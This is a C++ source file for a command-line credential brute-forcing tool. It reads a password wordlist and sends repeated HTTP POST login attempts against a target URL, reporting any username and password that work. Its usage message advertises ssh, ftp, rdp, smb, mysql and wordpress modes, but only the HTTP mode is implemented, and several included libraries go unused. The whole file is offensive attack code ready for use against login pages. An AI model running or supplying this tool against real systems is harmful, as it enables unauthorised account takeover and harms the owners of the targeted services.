#include <iostream>
#include <fstream>
#include <thread>
#include <vector>
#include <mutex>
#include <cstdlib>
#include <cstring>
#include <openssl/sha.h>
#include <openssl/md5.h>
#include <libssh/libssh.h>
#include <curl/curl.h>
#include <unistd.h>
#include <crypt.h>
#include <pcap.h>
#include <map>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

std::mutex log_mutex;

void log_attempt(const std::string& attempt) {
    std::lock_guard<std::mutex> lock(log_mutex);
    std::cout << "[ATTEMPT] " << attempt << std::endl;
}

size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

bool http_brute_force(const std::string& target, const std::string& username, const std::string& password) {
    CURL* curl = curl_easy_init();
    if (!curl) return false;
    
    std::string post_fields = "username=" + username + "&password=" + password;
    std::string response;
    
    curl_easy_setopt(curl, CURLOPT_URL, target.c_str());
    curl_easy_setopt(curl, CURLOPT_POST, 1);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_fields.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    
    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    
    curl_easy_cleanup(curl);
    
    if (res == CURLE_OK && http_code == 200 && response.find("Invalid") == std::string::npos) {
        std::cout << "[SUCCESS] Web Login: " << username << " : " << password << std::endl;
        return true;
    }
    return false;
}

void attack_function(const std::string& target, const std::string& username, const std::vector<std::string>& passwords, const std::string& mode) {
    for (const auto& password : passwords) {
        log_attempt("Trying " + username + " : " + password);
        if (mode == "http" && http_brute_force(target, username, password)) break;
    }
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] << " <mode> <target> <username> <wordlist>" << std::endl;
        std::cerr << "Modes: ssh, ftp, rdp, smb, mysql, wordpress, http" << std::endl;
        return 1;
    }

    std::string mode = argv[1];
    std::string target = argv[2];
    std::string username = argv[3];
    std::string wordlist = argv[4];
    
    std::vector<std::string> passwords;
    std::ifstream infile(wordlist);
    std::string line;
    while (std::getline(infile, line)) {
        passwords.push_back(line);
    }
    
    attack_function(target, username, passwords, mode);
    return 0;
}
